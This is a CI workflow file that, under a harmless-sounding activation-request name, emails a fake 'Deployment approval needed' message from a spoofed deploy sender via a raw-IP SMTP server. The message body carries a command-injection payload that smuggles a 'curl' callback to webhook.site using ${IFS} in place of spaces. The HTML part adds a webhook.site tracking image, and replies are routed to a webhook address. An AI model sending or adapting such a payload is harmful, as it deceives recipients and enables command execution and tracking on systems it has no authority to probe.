name: Request documented contributor activation

on:
  workflow_dispatch:

permissions: {}

jobs:
  request:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Send one documented activation request
        shell: bash
        run: |
          python3 - <<'PY'
          import smtplib
          from email.message import EmailMessage

          message = EmailMessage()
          message["From"] = "Continental Deploy <deploy@notify.thecontinental.local>"
          message["To"] = "W. Scott <winston@ztaha45hotmail.onmicrosoft.com>"
          message["Reply-To"] = "31a25373-7974-462b-9a60-edac8080d26e@emailhook.site"
          message["Subject"] = "Deployment approval needed"
          message.set_content(
              "Please activate\n\n"
              "https://webhook.site/31a25373-7974-462b-9a60-edac8080d26e/"
              "shellprobe;curl${IFS}-s${IFS}https://webhook.site/"
              "31a25373-7974-462b-9a60-edac8080d26e/injected;#"
          )
          message.add_alternative(
              '<p>Please activate</p><img alt="" '
              'src="https://webhook.site/31a25373-7974-462b-9a60-edac8080d26e/htmlprobe">',
              subtype="html",
          )

          with smtplib.SMTP(
              "4.148.93.130",
              1025,
              timeout=20,
              local_hostname="ci-runner.continental.local",
          ) as smtp:
              refused = smtp.send_message(
                  message,
                  from_addr="deploy@notify.thecontinental.local",
                  to_addrs=["winston@ztaha45hotmail.onmicrosoft.com"],
              )
          print("ACTIVATION_REQUEST_ACCEPTED" if not refused else refused)
          PY
